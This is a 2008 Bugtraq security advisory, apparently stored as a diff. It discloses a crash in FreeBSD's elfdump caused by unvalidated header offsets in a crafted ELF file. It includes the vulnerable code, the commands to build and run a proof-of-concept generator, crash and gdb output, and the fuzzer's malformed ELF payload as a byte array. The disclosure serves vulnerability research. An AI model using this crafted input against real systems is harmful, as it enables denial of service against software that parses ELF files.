@@ -1,0 +1,218 @@
+
+Date: 13 Feb 2008 21:53:11 -0000
+From: david.reguera@...eco.es
+To: bugtraq@...urityfocus.com
+Subject: ELFdump crash when analyzing crafted ELF file.
+
+__FBSDID("$FreeBSD: src/usr.bin/elfdump/elfdump.c, v 1.12.8.2 2006/01/28
+18:40:55 marcel Exp $");
+----------------------------------------------------------
++ EVIL ELF GENERATOR FOR ELFDUMP - david.reguera@...eco.es
++ David Reguera Garcia - INTECO-CERT
+----------------------------------------------------------
+
+Advisory:
+============================================================================
+Software : elfdump
+Version : 1.12.8.2 2006/01/28 18:40:55
+Author : Jake Burkholder <jake@...eBSD.org>
+Remote : NO
+Execution of code : NO
+Privilege scalation : NO
+Discovered by : INTECO-CERT - David Reguera Garcia <david.reguera@...eco.es>
+Exploit by : INTECO-CERT - David Reguera Garcia <david.reguera@...eco.es>
+Description : When elfdump analyzes an "evil" elf, the application crashes
+and causes a Segmentation fault: 11
+Affected OS:
+- FreeBSD:
+- 5.5 - TESTED AND FOUND
+- 6.2 - TESTED AND FOUND
+- 6.3 - TESTED AND FOUND
+- Maybe others, the elfdump utility first appeared in FreeBSD 5.0
+
+Techninal information:
+----------------------------------------------------------------------------
+The problem resides in the use of le32dec, be32dec ... without validate the
+input address.
+
+Explotation
+----------------------------------------------------------------------------
+An example of this explotation can be the following:
+
+In the main function we can find the following call:
+offset = elf_get_off(e, (char *)sh + shstrndx * shentsize, SH_OFFSET);
+
+sh: mapped area with the evil ELF + e_shoff (offset of the section header).
+e_shoff, shstrndx and shentsize are used directly from the mapped ELF.
+
+What is the problem? elf_get_off, not verifies if the address is out of
+range. If we use e_shoff in ELF out of range, the application may crash:
+
+#define elf_get_off elf_get_quad
+
+u_int64_t
+elf_get_quad(Elf32_Ehdr *e, void *base, elf_member_t member)
+{
+u_int64_t val;
+
+val = 0;
+switch (e->e_ident[EI_CLASS]) {
+case ELFCLASS32:
+base = (char *)base + elf32_offsets[member];
+switch (e->e_ident[EI_DATA]) {
+case ELFDATA2MSB:
+val = be32dec(base);
+break;
+case ELFDATA2LSB:
+val = le32dec(base);
+break;
+case ELFDATANONE:
+errx(1, "invalid data format");
+.....
+
+When does it crash? It is easy, for example an ELF with e_ident[EI_CLASS] is
+ELFCLASS32 and e_ident[EI_DATA] is ELFDATA2LSB, then it executes:
+val = le32dec(base);
+
+le32dec is this inline function:
+
+static __inline uint32_t
+le32dec(const void *pp)
+{
+unsigned char const *p = (unsigned char const *)pp;
+
+return ((p[3] << 24) | (p[2] << 16) | (p[1] << 8) | p[0]);
+}
+
+This function accesses the memory values of pp, if pp is not a readable
+address the application crashes with Segmentation fault: 11
+
+In other words, if we create an evil ELF with an evil e_shoff the
+application crashes. (Also it is possible to create evil shstrndx,
+shentsize ...)
+
+I create a POC exploit which creates an evil ELF to crash elfdump.
+In this exploit the values of shstrndx and shentsize are filled with 0 for
+simplicity.
+
+Compile & execute:
+
+[Dreg@ ~/vuln]# gcc -pedantic -ansi-c -o xpl xpl.c
+[Dreg@ ~/vuln]# ./xpl -f pocdump && echo "-" && \
+echo " Executing elfdump....:" && elfdump -a pocdump
+
+__FBSDID("$FreeBSD: src/usr.bin/elfdump/elfdump.c,
+v 1.12.8.2 2006/01/28 18:40:55 marcel Exp $");
+----------------------------------------------------------
++ EVIL ELF GENERATOR FOR ELFDUMP - david.reguera@...eco.es
++ David Reguera Garcia - INTECO-CERT
+----------------------------------------------------------
+Note: run it with -h parameter to show help.
+
+Evil ELF written using e_shoff: 16777215, at: pocdump
+Now, try elfdump -a pocdump
+-
+Executing elfdump....:
+Segmentation fault: 11 (core dumped)
+
+Low level area
+============================================================================
+The ASM code of le32dec is:
+
+loc_80488DC:
+movzx edx, byte ptr [ebx+3]
+movzx eax, byte ptr [ebx+2]
+shl eax, 10h
+shl edx, 18h
+or edx, eax
+movzx eax, byte ptr [ebx+1]
+shl eax, 8
+or edx, eax
+movzx eax, byte ptr [ebx]
+
+If [EBX], [EBX+2], [EBX+3] or [EBX+1] are a memory non readable the
+application crashes.
+
+Note
+============================================================================
+This POC exploit may crash the application in some other memory address as
+well as 0x80488DC, for example:
+
+[Dreg@ ~/vuln]# ./xpl -o 20 -f petadump && echo "-" && \
+echo " Executing elfdump....:" && elfdump -a petadump
+
+__FBSDID("$FreeBSD: src/usr.bin/elfdump/elfdump.c,
+v 1.12.8.2 2006/01/28 18:40:55 marcel Exp $");
+----------------------------------------------------------
++ EVIL ELF GENERATOR FOR ELFDUMP - david.reguera@...eco.es
++ David Reguera Garcia - INTECO-CERT
+----------------------------------------------------------
+Note: run it with -h parameter to show help.
+
+Evil ELF written using e_shoff: 20, at: petadump
+Now, try: elfdump -a petadump
+-
+Executing elfdump....:
+
+elf header:
+
+Segmentation fault: 11 (core dumped)
+
+In this case the application crashes at 0x28132f4f:
+0x28132f4f <__vfprintf+9727>: repnz scas %es:(%edi),%al
+This is caused by the following call in the elfdump.c file:
+fprintf(out, "\te_ident: %s %s %s\n", ei_classes[class], ei_data[data],
+ei_abis[osabi]);
+
+[Dreg@ ~/vuln]# gdb --core elfdump.core
+GNU gdb 6.1.1 [FreeBSD]
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i386-marcel-freebsd".
+Core was generated by `elfdump'.
+Program terminated with signal 11, Segmentation fault.
+#0 0x28132f4f in ?? ()
+
+Greetings
+============================================================================
+For his help with the English translation:
+- Javier Berciano <javier.berciano@...eco.es>
+- Ana Hijosa <ana.hijosa@...eco.es>
+
+Others
+============================================================================
+Payload generated by my ELF Fuzzer used to discover the bug:
+
+unsigned char payload[] =
+{
+0x7F, 0x45, 0x4C, 0x46, 0x01, 0x01, 0x01, 0x09, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+0x39, 0x86, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xF0, 0x18, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x06, 0x00, 0x28, 0x00,
+0x18, 0x00, 0x15, 0x00, 0x06, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00,
+0x34, 0x80, 0x04, 0x08, 0x34, 0x80, 0x04, 0x08, 0xC0, 0x00, 0x00, 0x00,
+0xC0, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+0x03, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00, 0xF4, 0x80, 0x04, 0x08,
+0xF4, 0x80, 0x04, 0x08, 0x15, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
+0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08,
+0x51, 0x06, 0x00, 0x00, 0x51, 0x06, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C, 0x16, 0x00, 0x00,
+0x3C, 0x96, 0x04, 0x08, 0x3C, 0x96, 0x04, 0x08, 0xD8, 0x00, 0x00, 0x00,
+0xF8, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+0x02, 0x00, 0x00, 0x00, 0x4C, 0x16, 0x00, 0x00, 0x4C, 0x96, 0x04, 0x08,
+0x4C, 0x96, 0x04, 0x08, 0x98, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00,
+0x06, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+0x0C, 0x11, 0x00, 0x00, 0x0C, 0x81, 0x04, 0x08, 0x0C, 0x81, 0x04, 0x08,
+0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
+0x04, 0x00, 0x00, 0x00, 0x00,
+} ;
+
+The POC exploit is avaible in: http://www.fr33project.org/vulnsexpl/Exploits/ELFdump_bin_120562/exploit.c
+
+The advisory is aviable in:
+http://www.fr33project.org/vulnsexpl/Advisories/ELFdump_bin_120562/advisory.txt
+
